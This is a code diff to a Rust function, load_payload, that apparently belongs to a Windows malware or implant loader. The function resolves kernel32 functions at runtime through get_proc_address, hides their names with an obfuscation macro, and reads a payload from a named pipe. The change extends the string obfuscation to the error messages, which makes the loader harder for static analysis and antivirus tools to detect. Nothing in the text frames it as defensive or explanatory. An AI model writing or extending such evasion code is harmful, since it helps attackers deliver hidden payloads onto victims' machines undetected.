@@ -83,9 +83,9 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         type ReadFileFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut c_void) -> i32;
         type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
 
-        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| "Failed to load CreateFileA")?);
-        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| "Failed to load ReadFile")?);
-        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| "Failed to load CloseHandle")?);
+        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
+        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
+        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);
 
         while attempts < MAX_ATTEMPTS {
              let h_file = create_file_a(
@@ -122,5 +122,5 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         }
     }
 
-    Err("Failed to read from named pipe".to_string())
+    Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to read from named pipe\0").as_slice()).to_string())
 }
